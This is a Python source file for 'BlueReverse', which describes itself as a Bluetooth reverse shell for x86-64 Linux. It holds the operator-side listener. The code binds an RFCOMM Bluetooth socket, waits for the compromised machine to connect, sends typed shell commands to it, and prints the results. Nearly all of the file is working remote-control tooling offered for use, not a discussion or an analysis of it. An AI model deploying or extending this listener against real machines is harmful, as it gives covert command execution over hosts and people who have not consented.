import socket, subprocess, os, sys
"""
BLUEREVERSE
Bluetooth reverse shell actually for x86-64 Linux system.

Copyright (C) 2018  Neetx

This file is part of bluereverse.

BlueReverse is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

BlueReverse is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>

CONTACTS:
	- neetx@protonmail.com

http://github.com/Neetx/BlueReverse
"""

print " ____  _            _____                              "
print "|  _ \| |          |  __ \                             "
print "| |_) | |_   _  ___| |__) |_____   _____ _ __ ___  ___ "
print "|  _ <| | | | |/ _ \  _  // _ \ \ / / _ \ '__/ __|/ _ \ "
print "| |_) | | |_| |  __/ | \ \  __/\ V /  __/ |  \__ \  __/"
print "|____/|_|\__,_|\___|_|  \_\___| \_/ \___|_|  |___/\___|"
print "                                                       " 
                                                        

hostMacAddress = 'XX:XX:XX:XX:XX:XX' #Put MAC here
port = 3	#Put channel here
backlog = 1
size = 1024
s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
print '******** SOCKET CREATED ********'
s.bind((hostMacAddress, port))
print '************ BINDED ************'
s.listen(backlog)
print '********** LISTENING ***********'
try:
	client, address = s.accept()
	print '----------> Accepted <----------'
	msg = raw_input("$ ")
	if len(msg):
		client.send(msg + "\n")
	while True:
		rl=1
		resp=""
		while rl:
			data = client.recv(4096)
			rl = len(data)
			resp += data
			if rl < 4096:
				break
		print resp
		msg = raw_input("$ ")
		msg += "\n"
		client.send(msg)
	client.close()
	s.close()
except:
	print '********** CLOSING ***********'
	s.close()
